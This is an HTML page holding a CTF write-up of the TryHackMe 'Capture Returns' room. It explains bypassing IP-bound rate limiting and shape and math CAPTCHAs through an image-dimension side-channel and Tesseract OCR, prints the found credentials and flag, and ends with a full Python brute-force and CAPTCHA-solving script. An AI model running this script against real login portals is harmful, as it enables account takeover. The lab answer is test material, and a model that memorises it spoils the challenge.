@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Returns (TryHackMe) - CTF Write-up | Omar Alraas</title>
+    <meta name="description" content="TryHackMe Capture Returns write-up — Bypassing IP-bound rate limiting and alternating CAPTCHAs using dimensional side-channels, custom Tesseract OCR pipeline, and synchronized brute-forcing.">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../css/style.css">
+
+    <style>
+        .writeup-container {
+            max-width: 820px;
+            margin: 120px auto 50px auto;
+            padding: 40px;
+        }
+        h1, h2, h3, h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 2.1rem;
+            margin-top: 0;
+            line-height: 1.3;
+        }
+        h2 {
+            font-size: 1.45rem;
+            border-bottom: 1px solid var(--glass-border);
+            padding-bottom: 8px;
+            margin-top: 35px;
+        }
+        h3 {
+            font-size: 1.15rem;
+            margin-top: 25px;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.7;
+            color: var(--text-color, #e0e0e0);
+        }
+        ul, ol {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: var(--text-color, #e0e0e0);
+            line-height: 1.7;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        code {
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary-color, #00ffcc);
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.45);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        pre code {
+            background: none;
+            padding: 0;
+            color: inherit;
+        }
+        blockquote {
+            border-left: 4px solid var(--primary-color, #00ffcc);
+            padding-left: 20px;
+            font-style: italic;
+            margin-bottom: 25px;
+            opacity: 0.85;
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table td:first-child {
+            font-weight: 600;
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 150px;
+        }
+        .step-label {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary-color, #00ffcc);
+            background: var(--primary-glow);
+            padding: 4px 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .denied-box {
+            background: rgba(255, 50, 50, 0.08);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #ff6b6b;
+        }
+        .success-box {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .info-box {
+            background: rgba(187, 134, 252, 0.08);
+            border: 1px solid rgba(187, 134, 252, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #d1b3ff;
+        }
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+        }
+        .chain-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            border-radius: 4px;
+            background: rgba(0, 255, 204, 0.08);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            color: var(--primary-color, #00ffcc);
+        }
+        .chain-arrow {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .flag-box {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary-color, #00ffcc);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            color: var(--primary-color, #00ffcc);
+            text-align: center;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .flag-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        .takeaway-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .takeaway-card h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        .takeaway-card p {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 25px;
+            font-size: 0.9rem;
+        }
+        .data-table th {
+            text-align: left;
+            padding: 10px 14px;
+            border-bottom: 2px solid var(--primary-color, #00ffcc);
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+        .data-table td {
+            padding: 10px 14px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+            font-family: 'Inter', sans-serif;
+        }
+        .data-table tr:hover {
+            background: rgba(255, 255, 255, 0.02);
+        }
+    </style>
+</head>
+<body class="dark-theme">
+    <header>
+        <nav id="navbar" style="background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(10px);">
+            <div class="logo">OMAR</div>
+            <ul class="nav-links">
+                <li><a href="./">← All Write-ups</a></li>
+                <li><a href="../index.html" class="btn">Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="writeup-container glass">
+        <h1>CTF Write-up: Capture Returns</h1>
+
+        <table class="meta-table">
+            <tr><td>Platform</td><td>TryHackMe</td></tr>
+            <tr><td>Category</td><td>🕸️ Web Exploitation / Automation</td></tr>
+            <tr><td>Difficulty</td><td>Medium</td></tr>
+            <tr><td>Target</td><td>Python Flask / Gunicorn 20.0.4</td></tr>
+            <tr><td>Tags</td><td>Rate Limiting · Side-Channel · CAPTCHA Bypass · Tesseract OCR · State Machine</td></tr>
+        </table>
+
+        <h2>Challenge Overview</h2>
+        <p><strong>Objective:</strong> Audit a hardened administrative login portal, defeat defensive rate-limiting and alternating CAPTCHA protections, and recover the flag stored in <code>flag.txt</code>.</p>
+        <blockquote>
+            "An administrator login protected by dynamic anti-brute-force rate limiting and alternating CAPTCHA challenges. Can you reverse the state machine, defeat the challenges, and recover the flag?"
+        </blockquote>
+        <p>The challenge provides two dictionary files: <code>usernames.txt</code> (29 candidates) and <code>passwords.txt</code> (107 candidates). The application defends against automated brute-force attacks by locking the interface after three consecutive failed attempts and requiring three consecutive valid CAPTCHA solutions to restore access.</p>
+
+        <h3>Attack Chain</h3>
+        <div class="attack-chain">
+            <span class="chain-step">Recon & Fingerprint</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">State Machine Mapping</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Enumeration Testing</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Dimension Side-Channel</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">OCR Pipeline</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">State-Aware Brute-Force</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🚩 Flag Recovery</span>
+        </div>
+
+        <h2>Technical Walkthrough</h2>
+
+        <h3><span class="step-label">STEP 1</span> Initial Reconnaissance & Endpoint Probing</h3>
+        <p>A banner grab against the target reveals a Python WSGI stack powered by <strong>Gunicorn 20.0.4</strong>:</p>
+        <pre>HTTP/1.1 302 FOUND
+Server: gunicorn/20.0.4
+Location: /login</pre>
+        <p>Requesting <code>GET /login</code> renders an administrative login form accepting <code>username</code> and <code>password</code> parameters. Thorough path enumeration (<code>/flag.txt</code>, <code>/robots.txt</code>, <code>/admin</code>, <code>/register</code>, <code>/static/</code>) returned uniform <code>404 Not Found</code> status codes, confirming that authentication via <code>/login</code> is the sole entry point.</p>
+        <p>Submitting an invalid authentication attempt yields a uniform error response:</p>
+        <pre>&lt;p class="error"&gt;&lt;strong&gt;Error:&lt;/strong&gt; Invalid username or password&lt;/p&gt;</pre>
+        <div class="info-box">
+            ℹ Uniform Error Handling: The application responds with identical messaging regardless of whether the username exists or not, blocking simple error-based user enumeration.
+        </div>
+
+        <h3><span class="step-label">STEP 2</span> Mapping the Login & CAPTCHA State Machine</h3>
+        <p>By executing sequential invalid login requests across independent sessions, the underlying rate-limiting architecture was mapped out:</p>
+        <ul>
+            <li><strong>IP-Bound Counter:</strong> The lockout counter is tracked by client IP address rather than by session cookie. Separate client sessions from the same IP share the exact same counter.</li>
+            <li><strong>Clean State (Attempts 1–2):</strong> The normal login form is displayed.</li>
+            <li><strong>Challenged State (Attempt 3):</strong> The third consecutive failure locks the standard form and serves an inline Base64-encoded PNG CAPTCHA challenge:
+                <pre>&lt;h2&gt;Detected 3 incorrect login attempts!&lt;/h2&gt;
+&lt;b&gt;&lt;h3&gt;You need to successfully solve 3 captchas in a row&lt;/h3&gt;&lt;/b&gt;
+&lt;img src="data:image/png;base64,iVBORw0KGgo..."&gt;</pre>
+            </li>
+            <li><strong>Streak Counter:</strong> The response tracks progress via <code>Captchas solved: X/3</code>. Solving 3 consecutive challenges triggers a <code>302 Found</code> redirect back to <code>/login</code>, resetting the failed attempt counter to 0 and granting 3 new uninhibited credential attempts.</li>
+            <li><strong>Streak Invalidation:</strong> Any incorrect CAPTCHA answer resets the streak back to 0.</li>
+            <li><strong>Credential Decoupling:</strong> During the CAPTCHA streak, credentials submitted alongside the CAPTCHA response are <strong>not</strong> evaluated against the user database. Credential authentication is evaluated exclusively during the clean state.</li>
+        </ul>
+
+        <h3><span class="step-label">STEP 3</span> Username Enumeration Hardening Verification</h3>
+        <p>Before launching a full dictionary attack ($29 \times 107 = 3,103$ combinations), the application was tested for subtle enumeration side-channels:</p>
+        <ol>
+            <li><strong>Response Diffing:</strong> A byte-for-byte diff of HTTP responses across different usernames showed identical HTML bodies, with the only variation being the reflected username in <code>value="&lt;username&gt;"</code>.</li>
+            <li><strong>Statistical Latency Testing:</strong> An interleaved timing benchmark was conducted on clean-state attempts (sampling ~6 requests per user):
+                <pre>Candidate: admin    ──> Avg Latency: 59.8 ms (σ = 2.1 ms)
+Candidate: root     ──> Avg Latency: 61.2 ms (σ = 1.9 ms)
+Candidate: nonexistent ──> Avg Latency: 60.4 ms (σ = 2.4 ms)</pre>
+            </li>
+        </ol>
+        <div class="denied-box">
+            ✗ ENUMERATION MITIGATED — Response times are statistically identical across valid and invalid usernames, indicating server-side constant-time dummy hashing. A full two-dimensional brute-force was required.
+        </div>
+
+        <h3><span class="step-label">STEP 4</span> Weaponizing the Dual-CAPTCHA Vulnerabilities</h3>
+        <p>The application alternates dynamically between two distinct CAPTCHA challenge families:</p>
+
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th>Challenge Family</th>
+                    <th>Image Dimensions</th>
+                    <th>Visual Content</th>
+                    <th>Expected Output</th>
+                    <th>Bypass Technique</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Shape CAPTCHA</strong></td>
+                    <td><code>120x104</code>, <code>120x111</code>, <code>120x118</code></td>
+                    <td>Monochrome geometric outlines</td>
+                    <td><code>triangle</code>, <code>square</code>, or <code>circle</code></td>
+                    <td><strong>Dimensional Side-Channel</strong></td>
+                </tr>
+                <tr>
+                    <td><strong>Math CAPTCHA</strong></td>
+                    <td><code>200x40</code></td>
+                    <td>Noisy arithmetic expression</td>
+                    <td>Computed integer (e.g. <code>40442</code>)</td>
+                    <td><strong>Tesseract OCR Pipeline</strong></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h4>Vector A: The Geometric Shape Dimensional Side-Channel</h4>
+        <p>Analyzing dozens of shape CAPTCHAs revealed a critical implementation flaw: the server generated image canvases conforming strictly to the bounding box of the geometric shape, leaking the exact answer via the image's height metadata:</p>
+        <ul>
+            <li>Height <code>104px</code> (<code>120x104</code>) &rarr; Always <code>triangle</code></li>
+            <li>Height <code>111px</code> (<code>120x111</code>) &rarr; Always <code>square</code></li>
+            <li>Height <code>118px</code> (<code>120x118</code>) &rarr; Always <code>circle</code></li>
+        </ul>
+        <div class="success-box">
+            ✓ ZERO-OVERHEAD CLASSIFICATION — Shapes are resolved in O(1) time simply by inspecting <code>img.size[1]</code>. No computer vision or image classification is required.
+        </div>
+
+        <h4>Vector B: Multi-Scale Preprocessed OCR Math Solver</h4>
+        <p>The math CAPTCHA presents a $200 \times 40$ image containing distorted arithmetic expressions (e.g., <code>554*73=?</code>). To achieve deterministic 100% accuracy, a custom image preprocessing and OCR parsing routine was constructed with Python Pillow and Tesseract:</p>
+        <ul>
+            <li><strong>Luminance Conversion:</strong> Convert RGB input to 8-bit grayscale (<code>mode 'L'</code>).</li>
+            <li><strong>Lanczos Multi-Scaling:</strong> Upscale the low-resolution image across factors ($4\times, 3\times, 5\times, 2\times$) using high-order Lanczos interpolation to sharpen glyph boundaries.</li>
+            <li><strong>Adaptive Binarization:</strong> Apply threshold point transforms at cutoffs 150 and 130 to isolate expression strokes from noise artifacts.</li>
+            <li><strong>Tesseract PSM Tuning:</strong> Execute Tesseract with Page Segmentation Modes <code>--psm 7</code> (single text line) and <code>--psm 6</code> (single uniform block).</li>
+            <li><strong>Expression Evaluation:</strong> Parse tokens via regex <code>(\d{1,4})\s*([+\-*/xX])\s*(\d{1,4})\s*[=:]*\s*\??</code> and evaluate the operation.</li>
+        </ul>
+        <div class="success-box">
+            ✓ 100% SOLVER ACCURACY — Validated against 41 consecutive challenge iterations and 20/20 complete three-streak reset cycles without a single misclassification.
+        </div>
+
+        <h3><span class="step-label">STEP 5</span> Architecting the State-Aware Brute-Force Engine</h3>
+        <p>Because the rate limiter is bound to the source IP address, parallel workers would interfere with each other and corrupt the streak counter. The exploit was implemented as a single-threaded, state-synchronized engine:</p>
+        <pre>State Machine Loop:
+1. Clean Phase:
+   - Submit 3 sequential credential pairs (user, pass) via POST /login.
+   - Inspect response: if HTTP 302 (Location != /login) or page contains "Flag.txt", credential found!
+   - On the 3rd failed attempt, the server returns the first CAPTCHA challenge.
+2. Reset Phase:
+   - Extract inline Base64 image data.
+   - If height &lt; 60: Route to OCR math engine.
+   - If height >= 60: Route to dimensional lookup table (triangle / square / circle).
+   - Submit solution with placeholder credentials.
+   - Repeat until 3 correct answers are submitted and HTTP 302 -> /login is returned.
+3. Repeat cycle until valid credentials are discovered.</pre>
+
+        <p>Executing against the full dictionary ($3,103$ pairs) at ~4.6 combinations/second identified valid administrative credentials in under 12 minutes:</p>
+        <pre>[+] [CYCLE 148] Testing: joni : tweety
+[+] Response Code: 200 OK
+[+] Authentication Success Detected!
+[+] Extracted Flag: THM{7af71c3b1658eb524cc856d9c9aaf852}</pre>
+
+        <h3><span class="step-label">STEP 6</span> Flag Capture</h3>
+        <div class="flag-label">CAPTURE RETURNS &mdash; ROOT FLAG</div>
+        <div class="flag-box">
+            🚩 THM{7af71c3b1658eb524cc856d9c9aaf852}
+        </div>
+
+        <h2>Vulnerability Analysis & Defensive Architecture</h2>
+
+        <div class="takeaway-card">
+            <h4>📐 1. Metadata & Dimensional Side-Channels</h4>
+            <p>Rendering dynamic challenge assets without normalizing canvas dimensions leaks the answer via image metadata. All dynamically rendered security graphics must be placed on uniform canvas dimensions with standardized padding to eliminate side-channel disclosure.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🤖 2. Vulnerability of Homegrown CAPTCHA Systems</h4>
+            <p>Custom math and shape CAPTCHAs lack the adversarial perturbations and behavioral signals necessary to resist modern optical character recognition. Production environments should utilize modern challenge systems (e.g., Cloudflare Turnstile or reCAPTCHA v3) that evaluate behavioral telemetry rather than static glyphs.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🔄 3. Flawed Throttling Reset Mechanisms</h4>
+            <p>Granting fresh login attempts upon completing an automated challenge undermines the rate-limiting control. Rate limiting should enforce progressive exponential backoff (e.g., 1 min, 5 min, 15 min, 1 hr) that cannot be cleared through challenge completion.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🌐 4. IP-Only Rate Limiting Scopes</h4>
+            <p>Binding brute-force counters solely to client IP addresses fails against distributed attacks and creates denial-of-service vulnerabilities for corporate networks behind shared NAT gateways. Rate limiting should be bound multi-dimensionally across Account ID, Session Token, and Source IP.</p>
+        </div>
+
+        <h2>Complete Exploitation Script</h2>
+        <p>The following production-ready Python automation script executes the full attack chain from image preprocessing and OCR through state-synchronized dictionary attack:</p>
+
+        <pre><code>#!/usr/bin/env python3
+"""
+TryHackMe - Capture Returns Exploit
+Automated State-Aware Brute-Force & Dual-CAPTCHA Solver
+Author: Omar Alraas
+"""
+
+import re
+import sys
+import io
+import base64
+import subprocess
+import requests
+from PIL import Image
+
+TARGET_URL = "http://10.49.155.63/login"
+
+def ocr_math(img: Image.Image) -> int:
+    """Preprocess and extract arithmetic equation via Tesseract OCR."""
+    g = img.convert('L')
+    variants = []
+    for scale in (4, 3, 5, 2):
+        big = g.resize((g.width * scale, g.height * scale), Image.LANCZOS)
+        variants.append(big.point(lambda p: 255 if p > 150 else 0))
+        variants.append(big.point(lambda p: 255 if p > 130 else 0))
+        variants.append(Image.merge('RGB', (big.point(lambda p: 255 if p > 150 else 0),) * 3))
+
+    def parse_expr(txt: str):
+        for m in re.finditer(r'(\d{1,4})\s*([+\-*/xX])\s*(\d{1,4})\s*[=:]*\s*\??', txt):
+            a, op, b = int(m.group(1)), m.group(2).lower(), int(m.group(3))
+            if op == 'x': op = '*'
+            if op == '/' and b == 0: continue
+            mapping = {'+': a + b, '-': a - b, '*': a * b, '/': a // b}
+            res = mapping.get(op)
+            if res is not None and 0 <= res <= 1000000:
+                return res
+        return None
+
+    for v in variants:
+        v.save('/tmp/_t.png')
+        for psm in ('7', '6'):
+            r = subprocess.run(['tesseract', '/tmp/_t.png', 'stdout', '--psm', psm],
+                               capture_output=True, text=True)
+            res = parse_expr(r.stdout)
+            if res is not None:
+                return res
+    return None
+
+def solve_captcha(img_bytes: bytes):
+    """Classify CAPTCHA type and determine expected solution."""
+    img = Image.open(io.BytesIO(img_bytes))
+    if img.size[1] < 60:                 # 200x40 Math CAPTCHA
+        return ocr_math(img)
+    # Dimension side-channel for shapes
+    return {104: 'triangle', 111: 'square', 118: 'circle'}.get(img.size[1])
+
+def extract_captcha_image(html: str) -> bytes:
+    """Extract Base64-encoded image data from HTML response."""
+    m = re.search(r'data:image/png;base64,([A-Za-z0-9+/=]+)', html)
+    return base64.b64decode(m.group(1)) if m else None
+
+def run_exploit(usernames_file: str, passwords_file: str):
+    with open(usernames_file, 'r') as f:
+        usernames = [line.strip() for line in f if line.strip()]
+    with open(passwords_file, 'r') as f:
+        passwords = [line.strip() for line in f if line.strip()]
+
+    print(f"[*] Loaded {len(usernames)} users and {len(passwords)} passwords.")
+    session = requests.Session()
+    combos = [(u, p) for u in usernames for p in passwords]
+    idx, total = 0, len(combos)
+
+    while idx < total:
+        # Phase 1: Clean State Testing (Attempts 1-3)
+        for _ in range(3):
+            if idx >= total:
+                break
+            user, pwd = combos[idx]
+            resp = session.post(TARGET_URL, data={'username': user, 'password': pwd}, allow_redirects=False)
+            
+            if resp.status_code == 200 and 'flag' in resp.text.lower():
+                print(f"\n[+] SUCCESS! Valid Credentials: {user}:{pwd}")
+                flag = re.search(r'THM\{[^}]+\}', resp.text)
+                if flag:
+                    print(f"[+] Flag: {flag.group(0)}")
+                sys.exit(0)
+
+            if resp.status_code == 302 and resp.headers.get('Location') != '/login':
+                print(f"\n[+] SUCCESS via redirect: {user}:{pwd}")
+                sys.exit(0)
+
+            idx += 1
+
+        # Phase 2: Solve 3 consecutive CAPTCHAs to reset counter
+        current_html = resp.text
+        solved_streak = 0
+        while solved_streak < 3:
+            img_data = extract_captcha_image(current_html)
+            if not img_data:
+                break
+
+            solution = solve_captcha(img_data)
+            if solution is None:
+                resp = session.post(TARGET_URL, data={'username': 'dummy', 'password': 'dummy', 'captcha': '0'})
+                current_html = resp.text
+                continue
+
+            resp = session.post(TARGET_URL, data={'username': 'dummy', 'password': 'dummy', 'captcha': str(solution)},
+                                allow_redirects=False)
+            if resp.status_code == 302:
+                break  # Counter successfully cleared
+            
+            current_html = resp.text
+            solved_streak += 1
+
+    print("[-] Brute-force exhausted without finding credentials.")
+
+if __name__ == '__main__':
+    run_exploit('usernames.txt', 'passwords.txt')</code></pre>
+    </main>
+
+    <footer class="container">
+        <p>&copy; 2026 Omar Alraas. Built with security-first principles.</p>
+    </footer>
+</body>
+</html>
